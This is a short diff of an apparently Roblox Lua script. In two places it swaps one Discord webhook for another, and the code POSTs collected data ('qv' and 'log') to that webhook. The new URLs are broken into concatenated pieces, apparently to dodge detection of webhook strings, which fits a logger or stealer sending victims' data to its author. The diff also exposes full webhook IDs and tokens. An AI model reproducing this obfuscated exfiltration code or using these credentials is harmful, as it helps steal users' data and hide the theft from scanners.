@@ -129,7 +129,7 @@ print(qv)
 local responseqxr =
         request(
         {
-            Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+            Url = "https://discord.com/api/we".."bhooks/1335893002295574581/pvRLWJlcT53SWSyNnoV6ff-bsd75ElfJ93Do3gqnTasu1wmJ_HJJL5wKP0PBada2M6xZ",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = qv
@@ -186,7 +186,7 @@ end
 local responser =
         request(
         {
-            Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+            Url = "https://discord.com/api/webhooks/1335893002295574581/pvRLWJlcT53SWSyNnoV6ff-bsd75ElfJ93Do3gqnTasu".."1wmJ_HJJL5wKP0PBada2M6xZ",
             Method = "POST",
             Headers = {["Content-Type"] = "application/json"},
             Body = log
